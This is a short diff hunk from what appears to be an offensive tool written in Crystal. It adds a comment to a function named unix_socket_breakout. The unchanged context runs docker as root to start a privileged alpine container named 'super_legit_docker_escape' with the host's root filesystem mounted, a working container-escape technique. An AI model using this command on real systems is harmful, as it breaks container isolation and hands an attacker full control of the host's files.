@@ -1,6 +1,7 @@
 def unix_socket_breakout
   uid=LibC.getuid
   if uid == 0
+    # should move to using http once crystal gets proper unix support. 
     docker_loc = docker_install
     puts `#{docker_loc} rm -f super_legit_docker_escape; #{docker_loc} run -i -t -d -v /:/hostos --privileged --name super_legit_docker_escape alpine /bin/sh`
     puts "We should have started a privileged container with the host OS filesystem mounted."
